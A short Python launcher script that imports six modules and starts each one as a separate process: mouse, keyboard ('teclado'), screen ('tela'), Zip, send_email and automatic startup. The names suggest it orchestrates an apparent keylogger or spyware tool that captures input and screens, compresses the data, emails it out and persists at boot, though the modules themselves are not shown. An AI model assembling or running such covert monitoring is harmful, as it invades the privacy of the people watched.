import mouse, teclado, tela, Zip, send_email, inicializacao_automatica
import subprocess

# Listar seus scripts
scripts = ['mouse.py', 'teclado.py', 'tela.py', 'Zip.py','send_email.py','inicializacao_automatica.py']

# Criando processos
processes = []

# Iniciando processos
for script in scripts:
    process = subprocess.Popen(["python", script])
    processes.append(process)

